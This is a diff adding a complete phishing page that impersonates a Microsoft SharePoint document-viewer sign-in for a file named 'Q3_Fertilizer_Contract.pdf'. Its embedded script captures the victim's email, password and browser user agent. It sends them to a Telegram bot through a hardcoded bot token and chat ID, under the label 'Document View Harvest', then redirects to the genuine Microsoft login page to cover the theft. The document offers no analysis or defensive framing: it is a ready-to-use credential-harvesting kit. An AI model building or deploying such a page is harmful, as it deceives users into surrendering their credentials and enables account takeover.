@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Viewer - SharePoint</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', 'Helvetica Neue', 'Lucida Grande', 'Roboto', 'Ebrima', 'Nirmala UI', 'Gadugi', 'Segoe MDL2 Assets', 'Bahnschrift', 'Arial Unicode UI', sans-serif;
+            background-color: #f3f2f1;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+        }
+
+        /* Top Bar */
+        .top-bar {
+            background-color: #0078d4;
+            color: white;
+            padding: 0 20px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            font-weight: 600;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .top-bar .logo svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        /* Main Content */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .login-box {
+            background-color: #ffffff;
+            width: 440px;
+            padding: 44px 44px 36px 44px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
+            box-sizing: border-box;
+            text-align: center;
+        }
+
+        .login-box h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin: 0 0 20px 0;
+        }
+
+        .login-box p {
+            font-size: 15px;
+            color: #60594c;
+            margin: 0 0 30px 0;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 8px;
+            font-weight: 400;
+        }
+
+        input[type="email"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px 12px;
+            font-size: 15px;
+            border: 1px solid #7a7a7a;
+            border-radius: 2px;
+            box-sizing: border-box;
+            transition: border 0.2s;
+            background-color: #fff;
+            color: #1b1b1b;
+        }
+
+        input:focus {
+            border: 2px solid #0078d4;
+            outline: none;
+            padding: 9px 11px;
+        }
+
+        .next-btn {
+            background-color: #0078d4;
+            color: white;
+            border: 1px solid #0078d4;
+            padding: 8px 36px;
+            font-size: 15px;
+            cursor: pointer;
+            border-radius: 2px;
+            font-weight: 400;
+            margin-top: 10px;
+        }
+
+        .next-btn:hover {
+            background-color: #005a9e;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: none;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #60594c;
+            padding: 20px;
+        }
+
+        .file-icon {
+            width: 40px;
+            height: 40px;
+            background-color: #d24726;
+            color: white;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 2px;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <div class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23">
+                <path fill="#f25022" d="M1 1h10v10H1z"/>
+                <path fill="#00a4ef" d="M12 1h10v10H12z"/>
+                <path fill="#7fba00" d="M1 12h10v10H1z"/>
+                <path fill="#f9ab00" d="M12 12h10v10H12z"/>
+            </svg>
+        </div>
+        <span>SharePoint</span>
+    </div>
+
+    <div class="main-content">
+        <div class="login-box">
+            <div class="file-icon">PDF</div>
+            <h1>Sign in to view document</h1>
+            <p>You need to sign in to access the file: <strong>Q3_Fertilizer_Contract.pdf</strong></p>
+
+            <form id="loginForm" onsubmit="return false;">
+                <div class="input-group">
+                    <label for="email">Email or phone</label>
+                    <input type="email" id="email" placeholder="name@company.com" required>
+                </div>
+
+                <div class="input-group" id="passwordGroup" style="display: none;">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Password" required>
+                </div>
+
+                <div style="text-align: center; margin-top: 20px;">
+                    <div class="loader" id="loader"></div>
+                    <button type="submit" class="next-btn" id="nextBtn">Next</button>
+                </div>
+            </form>
+
+            <div style="margin-top: 20px; font-size: 13px;">
+                <a href="#" style="color: #0078d4; text-decoration: none;">Forgot password?</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>Microsoft 365</p>
+    </div>
+
+    <script>
+        // --- TELEGRAM CONFIGURATION ---
+        const BOT_TOKEN = "8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ";
+        const CHAT_ID = 6479764005;
+        // ------------------------------
+
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const passwordGroup = document.getElementById('passwordGroup');
+        const nextBtn = document.getElementById('nextBtn');
+        const loader = document.getElementById('loader');
+
+        let emailValue = "";
+
+        nextBtn.addEventListener('click', () => {
+            if (passwordGroup.style.display === 'none') {
+                if (emailInput.value && emailInput.value.includes('@')) {
+                    emailValue = emailInput.value;
+                    passwordGroup.style.display = 'block';
+                    passwordInput.focus();
+                    nextBtn.style.display = 'none';
+                    setTimeout(() => {
+                        nextBtn.style.display = 'block';
+                    }, 100);
+                }
+            } else {
+                if (passwordInput.value) {
+                    submitCredentials();
+                }
+            }
+        });
+
+        function submitCredentials() {
+            const passwordValue = passwordInput.value;
+            const userAgent = navigator.userAgent;
+
+            nextBtn.style.display = 'none';
+            loader.style.display = 'block';
+
+            const text = `📄 *Document View Harvest* 📧 Email: <code>${emailValue}</code> 🔑 Password: <code>${passwordValue}</code> 📱 Device: <code>${userAgent}</code> 📂 File: Q3_Fertilizer_Contract.pdf`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            })
+            .then(response => {
+                setTimeout(() => {
+                    window.location.href = "https://login.microsoftonline.com";
+                }, 1000);
+            })
+            .catch(error => {
+                setTimeout(() => {
+                    window.location.href = "https://login.microsoftonline.com";
+                }, 1000);
+            });
+        }
+    </script>
+
+</body>
+</html>
